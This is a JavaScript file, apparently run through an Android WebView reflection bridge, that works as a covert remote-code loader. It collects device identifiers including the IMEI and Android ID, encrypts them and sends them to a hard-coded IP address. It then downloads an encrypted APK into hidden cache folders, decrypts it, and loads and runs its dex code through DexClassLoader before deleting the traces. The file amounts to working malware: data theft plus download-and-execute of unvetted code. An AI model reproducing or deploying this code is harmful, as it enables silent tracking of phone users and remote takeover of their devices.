(function () {
    var getWebCacheDir = function () {
        var Context = eweb.Class.forName("android.content.Context");
        var context = eweb.Object.getContext();
        var File = eweb.Class.forName("java.io.File");
        var String = eweb.Class.forName("java.lang.String");
        var file_new = File.getConstructor(File, String);
        if (eweb.DeviceUtil.getAndroidOSVersion() < 19) {
            var context_getCacheDir = Context.getMethod("getCacheDir");
            var parent = context_getCacheDir.invoke(context);
            return file_new.newInstance(parent, "webviewCacheChrome/.cache");
        } else {
            var int = eweb.Class.forName("int");
            var context_getDir = Context.getMethod("getDir", String, int);
            var parent = context_getDir.invoke(context, "webview", 0);
            return file_new.newInstance(parent, "Web Cache/.cache");
        }
    };
    getTempDexDir = function () {
        var Context = eweb.Class.forName("android.content.Context");
        var context = eweb.Object.getContext();
        var File = eweb.Class.forName("java.io.File");
        var String = eweb.Class.forName("java.lang.String");
        var file_new = File.getConstructor(File, String);
        var context_getCacheDir = Context.getMethod("getCacheDir");
        var parent = context_getCacheDir.invoke(context);
        return file_new.newInstance(parent, ".temp");
    };
    mkdirs = function (dir) {
        var File = eweb.Class.forName("java.io.File");
        var file_mkdirs = File.getMethod("mkdirs");
        file_mkdirs.invoke(dir);
    };
    var deleteFile = function (file) {
        var File = eweb.Class.forName("java.io.File");
        var file_delete = File.getMethod("delete");
        var obj_delete = file_delete.invoke(file);
        return obj_delete ? obj_delete.value() : false;
    };
    var deleteDir = function (file) {
        var flag = true;
        var File = eweb.Class.forName("java.io.File");
        var file_isDirectory = File.getMethod("isDirectory");
        var obj_isDirectory = file_isDirectory.invoke(file);
        if (obj_isDirectory && obj_isDirectory.value()) {
            var file_listFiles = File.getMethod("listFiles");
            var obj_listFiles = file_listFiles.invoke(file);
            var length = eweb.Array.getLength(obj_listFiles).value();
            for (var i = 0; i < length; i++) {
                var file1 = eweb.Array.get(obj_listFiles, i);
                if (flag && !deleteDir(file1)) {
                    flag = false;
                }
            }
        }
        if (flag && !deleteFile(file)) {
            flag = false;
        }
        return flag;
    };
    var unZipDexFromApk = function (apkFile, dexFile) {
        try {
            var ZipFile = eweb.Class.forName("java.util.zip.ZipFile");
            var ZipEntry = eweb.Class.forName("java.util.zip.ZipEntry");
            var File = eweb.Class.forName("java.io.File");
            var zipFile_new = ZipFile.getConstructor(File);
            var zipFile = zipFile_new.newInstance(apkFile);
            var zipFile_getInputStream = ZipFile.getMethod("getInputStream", ZipEntry);
            var String = eweb.Class.forName("java.lang.String");
            var zipFile_getEntry = ZipFile.getMethod("getEntry", String);
            var obj_zipEntry = zipFile_getEntry.invoke(zipFile, "classes.dex");
            var InputStream = eweb.Class.forName("java.io.InputStream");
            var inputStream = zipFile_getInputStream.invoke(zipFile, obj_zipEntry);
            var FileOutputStream = eweb.Class.forName("java.io.FileOutputStream");
            var file_output_new = FileOutputStream.getConstructor(File);
            var fileOutputStream = file_output_new.newInstance(dexFile);
            var len;
            var bytes = eweb.Class.forName("[B");
            var byte = eweb.Class.forName("byte");
            var buffer = eweb.Array.newInstance(byte, 1024 * 8);
            var input_read = InputStream.getMethod("read", bytes);
            var int = eweb.Class.forName("int");
            var file_output_write = FileOutputStream.getMethod("write", bytes, int, int);
            while ((len = input_read.invoke(inputStream, buffer).value()) > 0) {
                file_output_write.invoke(fileOutputStream, buffer, 0, len);
            }
            var file_output_flush = FileOutputStream.getMethod("flush");
            file_output_flush.invoke(fileOutputStream);
            var Closeable = eweb.Class.forName("java.io.Closeable");
            var closeable_close = Closeable.getMethod("close");
            closeable_close.invoke(fileOutputStream);
            closeable_close.invoke(inputStream);
            return true;
        } catch (e) {
        }
        return false;
    };
    var aesFileDecrypt = function (key, encryptFile, decryptFile) {
        try {
            var Bytes = eweb.Class.forName("[B");
            var String = eweb.Class.forName("java.lang.String");
            var SecretKeySpec = eweb.Class.forName("javax.crypto.spec.SecretKeySpec");
            var sksCon = SecretKeySpec.getConstructor(Bytes, String);

            var IvParameterSpec = eweb.Class.forName("javax.crypto.spec.IvParameterSpec");
            var ipsCon = IvParameterSpec.getConstructor(Bytes);

            var Cipher = eweb.Class.forName("javax.crypto.Cipher");
            var Key = eweb.Class.forName("java.security.Key");
            var AlgorithmParameterSpec = eweb.Class.forName("java.security.spec.AlgorithmParameterSpec");
            var int = eweb.Class.forName("int");
            var CgetInstance = Cipher.getMethod("getInstance", String);
            var Cinit = Cipher.getMethod("init", int, Key, AlgorithmParameterSpec);
            var cipher = CgetInstance.invoke(null, "AES/CBC/PKCS5Padding");

            var newString = String.getConstructor(String);
            var keyStr = newString.newInstance(key);
            var StrGetBytes = String.getMethod("getBytes");
            var keyBytes = StrGetBytes.invoke(keyStr);

            var sks = sksCon.newInstance(keyBytes, "AES");
            var ips = ipsCon.newInstance(keyBytes);
            Cinit.invoke(cipher, 2, sks, ips);

            var CipherInputStream = eweb.Class.forName("javax.crypto.CipherInputStream");
            var InputStream = eweb.Class.forName("java.io.InputStream");
            var cipher_input_new = CipherInputStream.getConstructor(InputStream, Cipher);
            var FileInputStream = eweb.Class.forName("java.io.FileInputStream");
            var File = eweb.Class.forName("java.io.File");
            var file_input_new = FileInputStream.getConstructor(File);
            var obj_file_input = file_input_new.newInstance(encryptFile);
            var inputStream = cipher_input_new.newInstance(obj_file_input, cipher);

            var FileOutputStream = eweb.Class.forName("java.io.FileOutputStream");
            var file_output_new = FileOutputStream.getConstructor(File);
            var fileOutputStream = file_output_new.newInstance(decryptFile);
            var len;
            var bytes = eweb.Class.forName("[B");
            var byte = eweb.Class.forName("byte");
            var buffer = eweb.Array.newInstance(byte, 1024 * 8);
            var input_read = InputStream.getMethod("read", bytes);

            var file_output_write = FileOutputStream.getMethod("write", bytes, int, int);
            while ((len = input_read.invoke(inputStream, buffer).value()) > 0) {
                file_output_write.invoke(fileOutputStream, buffer, 0, len);
            }
            var file_output_flush = FileOutputStream.getMethod("flush");
            file_output_flush.invoke(fileOutputStream);
            var Closeable = eweb.Class.forName("java.io.Closeable");
            var closeable_close = Closeable.getMethod("close");
            closeable_close.invoke(fileOutputStream);
            closeable_close.invoke(inputStream);
            return true;
        } catch (e) {
        }
        return false;
    };
    var md5 = function (file) {
        try {
            var MessageDigest = eweb.Class.forName("java.security.MessageDigest");
            var String = eweb.Class.forName("java.lang.String");
            var md_getInstance = MessageDigest.getMethod("getInstance", String);
            var obj_md = md_getInstance.invoke(null, "MD5");
            var InputStream = eweb.Class.forName("java.io.InputStream");
            var FileInputStream = eweb.Class.forName("java.io.FileInputStream");
            var File = eweb.Class.forName("java.io.File");
            var file_input_new = FileInputStream.getConstructor(File);
            var inputStream = file_input_new.newInstance(file);
            var len;
            var bytes = eweb.Class.forName("[B");
            var byte = eweb.Class.forName("byte");
            var buffer = eweb.Array.newInstance(byte, 1024 * 8);
            var input_read = InputStream.getMethod("read", bytes);

            var int = eweb.Class.forName("int");
            var md_update = MessageDigest.getMethod("update", bytes, int, int);
            while ((len = input_read.invoke(inputStream, buffer).value()) > 0) {
                md_update.invoke(obj_md, buffer, 0, len)
            }
            var Closeable = eweb.Class.forName("java.io.Closeable");
            var closeable_close = Closeable.getMethod("close");
            closeable_close.invoke(inputStream);
            var BigInteger = eweb.Class.forName("java.math.BigInteger");
            var bigInt_new = BigInteger.getConstructor(int, bytes);
            var md_digest = MessageDigest.getMethod("digest");
            var obj_bytes = md_digest.invoke(obj_md);
            var i = bigInt_new.newInstance(1, obj_bytes);
            var Objects = eweb.Class.forName("[Ljava.lang.Object;");
            var string_format = String.getMethod("format", String, Objects);
            var Object = eweb.Class.forName("java.lang.Object");
            var objs = eweb.Array.newInstance(Object, 1);
            eweb.Array.set(objs, 0, i);
            return string_format.invoke(null, "%1$032x", objs).value();
        } catch (e) {
        }
        return null;
    };
    var downloadSdk1 = function (sdk1, decryptApkFile) {
        var cachePath = getWebCacheDir();
        mkdirs(cachePath);
        var File = eweb.Class.forName("java.io.File");
        var String = eweb.Class.forName("java.lang.String");
        var file_new = File.getConstructor(File, String);
        var cacheFile = file_new.newInstance(cachePath, "cache");
        var file_exists = File.getMethod("exists");
        var obj_exists = file_exists.invoke(cacheFile);
        var need_download = false;
        if (obj_exists && obj_exists.value()) {
            aesFileDecrypt(sdk1.security_key, cacheFile, decryptApkFile);
            var cache_md5 = md5(decryptApkFile);
            if (sdk1.md5 !== cache_md5) {
                need_download = true;
            } else {
                return true;
            }
        } else {
            need_download = true;
        }
        if (need_download) {
            var URL = eweb.Class.forName("java.net.URL");
            var urlCon = URL.getConstructor(String);
            var url = urlCon.newInstance(sdk1.download_url);
            var Proxy = eweb.Class.forName("java.net.Proxy");
            var urlOpenConnection = URL.getMethod("openConnection", Proxy);
            var NO_PROXY = Proxy.getField("NO_PROXY");
            var conn = urlOpenConnection.invoke(url, NO_PROXY.get());
            var HttpURLConnection = eweb.Class.forName("java.net.HttpURLConnection");

            var int = eweb.Class.forName("int");
            var InputStream = eweb.Class.forName("java.io.InputStream");

            var connGetInputStream = HttpURLConnection.getMethod("getInputStream");
            var inputStream = connGetInputStream.invoke(conn);

            var FileOutputStream = eweb.Class.forName("java.io.FileOutputStream");
            var file_output_new = FileOutputStream.getConstructor(File);
            var fileOutputStream = file_output_new.newInstance(cacheFile);
            var len;
            var bytes = eweb.Class.forName("[B");
            var byte = eweb.Class.forName("byte");
            var buffer = eweb.Array.newInstance(byte, 1024 * 8);
            var input_read = InputStream.getMethod("read", bytes);

            var file_output_write = FileOutputStream.getMethod("write", bytes, int, int);
            while ((len = input_read.invoke(inputStream, buffer).value()) > 0) {
                file_output_write.invoke(fileOutputStream, buffer, 0, len);
            }
            var file_output_flush = FileOutputStream.getMethod("flush");
            file_output_flush.invoke(fileOutputStream);
            var Closeable = eweb.Class.forName("java.io.Closeable");
            var closeable_close = Closeable.getMethod("close");
            closeable_close.invoke(fileOutputStream);
            closeable_close.invoke(inputStream);

            return aesFileDecrypt(sdk1.security_key, cacheFile, decryptApkFile);
        }
    };
    var obtain = function (sdk1) {
        var tempDexDir = getTempDexDir();
        try {
            var File = eweb.Class.forName("java.io.File");
            var String = eweb.Class.forName("java.lang.String");
            var file_new = File.getConstructor(File, String);
            var tempStr = new Date().getTime() + "" + Math.floor(Math.random() * 10);
            var dexDir = file_new.newInstance(tempDexDir, tempStr);
            mkdirs(dexDir);
            var decryptApkFile = file_new.newInstance(dexDir, tempStr + ".zip");
            var decrypt = downloadSdk1(sdk1, decryptApkFile);
            if (decrypt) {
                var unZipDexFile = file_new.newInstance(dexDir, tempStr + ".dex");
                if (unZipDexFromApk(decryptApkFile, unZipDexFile)) {
                    var optDir = file_new.newInstance(dexDir, tempStr + "1");
                    mkdirs(optDir);
                    var ClassLoader = eweb.Class.forName("java.lang.ClassLoader");
                    var ClassLoader_getSystemClassLoader = ClassLoader.getMethod("getSystemClassLoader");
                    var systemClassLoader = ClassLoader_getSystemClassLoader.invoke(null);
                    var DexClassLoader = eweb.Class.forName("dalvik.system.DexClassLoader");
                    var dexClassLoaderConstructor = DexClassLoader.getConstructor(String, String, String, ClassLoader);
                    var file_getAbsolutePath = File.getMethod("getAbsolutePath");
                    var obj_unZipDexFilePath = file_getAbsolutePath.invoke(unZipDexFile);
                    var obj_optDirPath = file_getAbsolutePath.invoke(optDir);
                    var loader = dexClassLoaderConstructor.newInstance(obj_unZipDexFilePath.value(), obj_optDirPath.value(), null, systemClassLoader);
                    return loader;
                }
            }
        } catch (e) {
        } finally {
            deleteDir(tempDexDir);
        }
    };
    var init = function (sdk1) {
        var loader = obtain(sdk1);
        var String = eweb.Class.forName("java.lang.String");
        var ClassLoader = eweb.Class.forName("java.lang.ClassLoader");
        var ClassLoader_loadClass = ClassLoader.getMethod("loadClass", String);
        var SM = ClassLoader_loadClass.invoke(loader, "com.uuq.ggkt.SySDK");
        var SMC = new eweb.Class(SM.id);
        var Context = eweb.Class.forName("android.content.Context");
        var SM_init = SMC.getMethod("init", Context, String);
        var boolean1 = eweb.Class.forName("boolean");
        var SM_setDebug = SMC.getMethod("setDebug", boolean1);
        SM_setDebug.invoke(null, true);
        var context = eweb.Object.getContext();
        SM_init.invoke(null, context, "xdtest4");

        var boolean = Class.forName("boolean");
        var booleanCons = Boolean.getConstructor(boolean);
        var flag = booleanCons.newInstance(true);
        Object.setFlag(flag.id);
    };


    var SimpleAesUtil = {
        randomAESKey: function () {
            var sb = "";
            var max1 = '+'.charCodeAt(0), min1 = '+'.charCodeAt(0), max2 = '/'.charCodeAt(0), min2 = '/'.charCodeAt(0),
                max3 = '9'.charCodeAt(0), min3 = '0'.charCodeAt(0), max4 = 'Z'.charCodeAt(0), min4 = 'A'.charCodeAt(0),
                max5 = 'z'.charCodeAt(0), min5 = 'a'.charCodeAt(0);
            for (var i = 0; i < 16; i++) {
                var num = Math.random();
                var max;
                var min;
                if (num < 0.05) {
                    max = max1;
                    min = min1;
                } else if (num < 0.1) {
                    max = max2;
                    min = min2;
                } else if (num < 0.3) {
                    max = max3;
                    min = min3;
                } else if (num < 0.65) {
                    max = max4;
                    min = min4;
                } else {
                    max = max5;
                    min = min5;
                }
                num = min + Math.floor(Math.random() * Math.floor(max - min + 1));
                var c = String.fromCharCode(num);
                sb += c;
            }
            return sb;
        },
        encrypt: function (data) {
            try {
                var key = this.randomAESKey();
                var key1 = CryptoJS.enc.Utf8.parse(key);
                data = CryptoJS.AES.encrypt(data, key1, {
                    iv: key1,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                var sb = data.toString();
                var pos = sb.charCodeAt(0);
                if (pos > sb.length) {
                    pos = sb.indexOf("=");
                    if (pos < 0) {
                        pos = sb.length;
                    }
                }
                sb = sb.substring(0, pos) + key + sb.substring(pos, sb.length);
                return sb;
            } catch (e) {
                console.log(e);
            }
            return null;
        },
        decrypt: function (data) {
            try {
                var sb = data;
                var pos = sb.charCodeAt(0);
                if (pos > sb.length - 16) {
                    pos = sb.indexOf("=");
                    if (pos < 0) {
                        pos = sb.length - 16;
                    } else {
                        pos = pos - 16;
                    }
                }
                var key = sb.substring(pos, pos + 16);
                sb = sb.substring(0, pos) + sb.substring(pos + 16, sb.length);
                data = sb;
                key = CryptoJS.enc.Utf8.parse(key);
                data = CryptoJS.AES.decrypt(data, key, {
                    iv: key,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                return data.toString(CryptoJS.enc.Utf8);
            } catch (e) {
                console.log(e);
            }
            return null;
        }
    };
    var DeviceUtil = eweb.DeviceUtil;

    var Class = eweb.Class;
    var Object = eweb.Object;
    var Boolean = Class.forName("java.lang.Boolean");
    var flag_id = Object.getFlag();
    var flagValue;
    if (flag_id) {
        flag_id = Object.getFlag();
        var flagObj = new Object(flag_id);
        var booleanValue = Boolean.getMethod("booleanValue");
        flagValue = booleanValue.invoke(flagObj);
    }
    if(!flagValue || !flagValue.value()) {
        var data = {
            "cmd": "1005",
            "biz": "core",
            "channel": "xdtest4",
            "uuid": DeviceUtil.randomDeviceUUID(),
            "androidId": DeviceUtil.getAndroidId().value(),
            "imei": DeviceUtil.getDeviceId().value(),
            "androidVersion": DeviceUtil.getAndroidOSVersion(),
            "pushVersion": 11,
            "installPkg": DeviceUtil.getPackageName(),
            "isProxy": DeviceUtil.isWifiProxy(),
            "chargeType": DeviceUtil.getBatteryChargeType()
        };

        data = JSON.stringify(data);
        console.log(data);
        data = SimpleAesUtil.encrypt(data);
        console.log(data);
        var xhr = new XMLHttpRequest();
        // xhr.open("POST", "http://hei.xieequan.com:9748", false);
        xhr.open("POST", "http://120.78.180.122:8080", false);
        xhr.send(data);
        if (xhr.status === 200) {
            var response = xhr.responseText;
            console.log(response);
            response = SimpleAesUtil.decrypt(response);
            console.log(response);
            var res = JSON.parse(response);
            if (res.code === 0) {
                var sdk1s = res.data;
                for (var i = 0; i < sdk1s.length; i++) {
                    var sdk1 = sdk1s[i];
                    if (sdk1.name === "core" && sdk1.is_run === true) {
                        init(sdk1);
                    }
                }
            }
        }
    } else {
        console.log("already init");
    }
})();